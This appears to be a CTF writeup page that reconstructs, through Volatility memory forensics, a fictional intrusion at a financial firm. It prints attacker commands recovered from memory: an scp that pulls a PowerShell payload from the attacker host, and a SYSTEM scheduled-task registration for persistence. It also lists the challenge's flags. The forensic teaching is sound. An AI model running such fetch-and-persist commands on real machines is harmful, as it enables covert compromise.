@@ -1,0 +1,81 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Who Goes There? — Writeup — arwah</title><meta name="description" content="A rogue Kali device landed on De Monne Financial&#x27;s network and someone used a legitimate employee account to reach the file share. The workstation memory holds the whole story: the…"><link rel="icon" href="/favicon.svg"><link rel="stylesheet" href="/writeups/writeups.css?v=20261019-2"></head><body><header class="library-nav"><a href="/#writeups">← Portfolio</a><a href="/writeups/">Writeup library</a></header><main><div class="article-meta">Forensics · 3 min read</div><details class="contents"><summary>On this page</summary><ul><li><a href="#summary">Summary</a></li><li><a href="#setup">Setup</a></li><li><a href="#flag-1-compromised-employee-nkessler">Flag 1 — compromised employee: nkessler</a></li><li><a href="#flag-2-workstation-hostname-dmf-ws11-042">Flag 2 — workstation hostname: DMF-WS11-042</a></li><li><a href="#flag-3-misspelled-server-name-dmf-fiels-01">Flag 3 — misspelled server name: dmf-fiels-01</a></li><li><a href="#flag-4-persistence-task-name-windowstelemetrycheck">Flag 4 — persistence task name: WindowsTelemetryCheck</a></li><li><a href="#flag-5-the-script-s-full-path">Flag 5 — the script&#x27;s full path</a></li><li><a href="#attack-chain-reconstructed">Attack chain reconstructed</a></li></ul></details><article class="prose"><h1 id="who-goes-there-writeup">Who Goes There? — Writeup</h1>
+<p><strong>Category:</strong> Memory Forensics (Volatility 3)
+<strong>Artifacts:</strong> <code>memory.raw</code> (8.5 GB, Windows 10 22H2, acquired with <code>go-winpmem</code>)
+<strong>Flags:</strong>
+<code>deadface{nkessler}</code> · <code>deadface{DMF-WS11-042}</code> · <code>deadface{dmf-fiels-01}</code> ·
+<code>deadface{WindowsTelemetryCheck}</code> · <code>deadface{C:\ProgramData\WindowsCache\telemetry.ps1}</code></p>
+<h2 id="summary">Summary</h2>
+<p>A rogue Kali device landed on De Monne Financial's network and someone used a
+legitimate employee account to reach the file share. The workstation memory
+holds the whole story: the attacker's SSH session, the persistence task they
+installed, the typo'd WebDAV attempt at the executive share, and (buried in the
+conhost screen buffer) every command they ran. The IR acquisition itself
+(<code>go-winpmem</code> writing <code>E:\Acquisition\memory.raw</code>) is even visible as the last
+console session — nice touch.</p>
+<h2 id="setup">Setup</h2>
+<pre><code class="language-bash">vol -f memory.raw windows.info      # Win10 22H2, SystemTime 2026-09-27
+vol -f memory.raw windows.pslist    # process timeline
+vol -f memory.raw windows.cmdline
+vol -f memory.raw windows.consoles  # &lt;-- the money plugin
+vol -f memory.raw windows.hashdump
+</code></pre>
+<h2 id="flag-1-compromised-employee-nkessler">Flag 1 — compromised employee: <code>nkessler</code></h2>
+<p><code>pslist</code> shows an <code>sshd.exe</code> chain starting <code>2026-09-27 20:21:51 UTC</code>:</p>
+<pre><code>444   sshd.exe (&quot;-R&quot;)
+3532  sshd.exe (&quot;-z&quot;)
+5424  conhost.exe --headless ... -- &quot;c:\windows\system32\cmd.exe&quot;
+8120  cmd.exe
+3300  powershell.exe
+</code></pre>
+<p><code>windows.consoles</code> dumps that conhost's screen buffer:</p>
+<pre><code>nkessler@DMF-WS11-042 C:\Users\nkessler&gt;powershell
+PS C:\Users\nkessler&gt; scp d34th@10.77.10.66:/home/d34th/telemetry.ps1 C:\ProgramData\WindowsCache\
+</code></pre>
+<p>The SSH session — from the Kali box — authenticated as <strong>nkessler</strong>, then
+staged malware and built persistence. <code>hashdump</code> corroborates the local
+accounts (<code>nkessler</code>, <code>dmf_support</code>).</p>
+<pre><code>deadface{nkessler}
+</code></pre>
+<h2 id="flag-2-workstation-hostname-dmf-ws11-042">Flag 2 — workstation hostname: <code>DMF-WS11-042</code></h2>
+<p>Same console line: <code>nkessler@DMF-WS11-042</code> (capitalization preserved exactly as
+displayed).</p>
+<pre><code>deadface{DMF-WS11-042}
+</code></pre>
+<h2 id="flag-3-misspelled-server-name-dmf-fiels-01">Flag 3 — misspelled server name: <code>dmf-fiels-01</code></h2>
+<p>UNC-path scan over the raw image (<code>rg -a -b</code> for <code>\\\\dmf[...]*</code>) surfaces
+ShellBag network items:</p>
+<pre><code>1188893429: \\dmf-fiels-01     &lt;-- typo (&quot;fiels&quot;)
+1188895221: \\dmf-field-01     &lt;-- correct
+1366098357: \\dmf-fiel-01      &lt;-- another typo
+</code></pre>
+<p>and nearby, WebDAV attempts at the executive share:</p>
+<pre><code>http://dmf-field-01/executive
+http://dmf-fiels-01/executive   &lt;-- the misspelled one reaching /executive
+</code></pre>
+<pre><code>deadface{dmf-fiels-01}
+</code></pre>
+<h2 id="flag-4-persistence-task-name-windowstelemetrycheck">Flag 4 — persistence task name: <code>WindowsTelemetryCheck</code></h2>
+<p>The attacker console shows the whole persistence ritual:</p>
+<pre><code class="language-powershell">$action   = New-ScheduledTaskAction -Execute 'powershell.exe' `
+            -Argument '-NoProfile -File C:\ProgramData\WindowsCache\telemetry.ps1'
+$trigger  = New-ScheduledTaskTrigger -Daily -At '23:59'
+$principal= New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+Register-ScheduledTask -TaskName 'WindowsTelemetryCheck' -Action $action -Trigger $trigger -Principal $principal -Force
+</code></pre>
+<pre><code>deadface{WindowsTelemetryCheck}
+</code></pre>
+<h2 id="flag-5-the-script-s-full-path">Flag 5 — the script's full path</h2>
+<p>Straight from the task action above — an unusual directory that normally holds
+nothing (<code>Test-Path ... False</code> before the scp):</p>
+<pre><code>deadface{C:\ProgramData\WindowsCache\telemetry.ps1}
+</code></pre>
+<h2 id="attack-chain-reconstructed">Attack chain reconstructed</h2>
+<ol>
+<li>Rogue Kali device (10.77.10.66) poisons LLMNR for <code>dmf-field-01</code>.</li>
+<li>Nathan's workstation (DMF-WS11-042 / 10.77.10.20) leaks NTLMv2 for
+<code>nkessler</code> to the attacker (see <em>Uninvited Guest</em> pcap writeup).</li>
+<li>Attacker SSHes into DMF-WS11-042 as nkessler (somehow in possession of the
+password), pulls <code>telemetry.ps1</code> from <code>d34th@10.77.10.66</code>, and registers the
+<code>WindowsTelemetryCheck</code> SYSTEM task for persistence.</li>
+</ol>
+</article><a class="back-link" href="/writeups/">← All writeups</a></main><footer>CTF solutions &amp; security notes · arwah</footer></body></html>
